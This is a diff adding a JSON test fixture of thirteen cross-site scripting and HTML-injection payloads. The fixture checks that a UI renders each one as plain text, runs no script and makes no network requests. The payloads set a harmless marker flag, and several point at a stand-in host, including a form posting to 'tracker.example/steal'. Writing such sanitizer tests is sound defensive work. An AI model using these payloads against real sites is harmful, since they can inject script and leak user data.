@@ -1,0 +1,122 @@
+{
+  "note": "R-UI-01: each payload sets window.__xss if it ever runs",
+  "cases": [
+    {
+      "id": "script",
+      "input": "<script>window.__xss=1</script>",
+      "expected": {
+        "renderedAsText": true,
+        "xss": "undefined",
+        "network": []
+      }
+    },
+    {
+      "id": "img-onerror",
+      "input": "<img src=x onerror=\"window.__xss=1\">",
+      "expected": {
+        "renderedAsText": true,
+        "xss": "undefined",
+        "network": []
+      }
+    },
+    {
+      "id": "svg-onload",
+      "input": "<svg onload=\"window.__xss=1\"></svg>",
+      "expected": {
+        "renderedAsText": true,
+        "xss": "undefined",
+        "network": []
+      }
+    },
+    {
+      "id": "javascript-link",
+      "input": "<a href=\"javascript:window.__xss=1\">open</a>",
+      "expected": {
+        "renderedAsText": true,
+        "xss": "undefined",
+        "network": []
+      }
+    },
+    {
+      "id": "data-link",
+      "input": "<a href=\"data:text/html,<script>window.__xss=1</script>\">open</a>",
+      "expected": {
+        "renderedAsText": true,
+        "xss": "undefined",
+        "network": []
+      }
+    },
+    {
+      "id": "iframe-srcdoc",
+      "input": "<iframe srcdoc=\"<script>parent.window.__xss=1</script>\"></iframe>",
+      "expected": {
+        "renderedAsText": true,
+        "xss": "undefined",
+        "network": []
+      }
+    },
+    {
+      "id": "style-import",
+      "input": "<style>@import url(\"https://tracker.example/x.css\");</style>",
+      "expected": {
+        "renderedAsText": true,
+        "xss": "undefined",
+        "network": []
+      }
+    },
+    {
+      "id": "meta-refresh",
+      "input": "<meta http-equiv=\"refresh\" content=\"0;url=https://tracker.example/\">",
+      "expected": {
+        "renderedAsText": true,
+        "xss": "undefined",
+        "network": []
+      }
+    },
+    {
+      "id": "form-action",
+      "input": "<form action=\"https://tracker.example/steal\"><input name=\"q\" value=\"1200\"><button>Go</button></form>",
+      "expected": {
+        "renderedAsText": true,
+        "xss": "undefined",
+        "network": []
+      }
+    },
+    {
+      "id": "object",
+      "input": "<object data=\"https://tracker.example/x.swf\"></object>",
+      "expected": {
+        "renderedAsText": true,
+        "xss": "undefined",
+        "network": []
+      }
+    },
+    {
+      "id": "mutation-xss",
+      "input": "<math><mtext><table><mglyph><style><img src onerror=\"window.__xss=1\">",
+      "expected": {
+        "renderedAsText": true,
+        "xss": "undefined",
+        "network": []
+      }
+    },
+    {
+      "id": "template-string",
+      "input": "{{constructor.constructor('window.__xss=1')()}}",
+      "expected": {
+        "renderedAsText": true,
+        "xss": "undefined",
+        "network": []
+      }
+    },
+    {
+      "id": "entity-script",
+      "input": "&lt;script&gt;window.__xss=1&lt;/script&gt;",
+      "expected": {
+        "renderedAsText": true,
+        "xss": "undefined",
+        "network": []
+      }
+    }
+  ]
+}
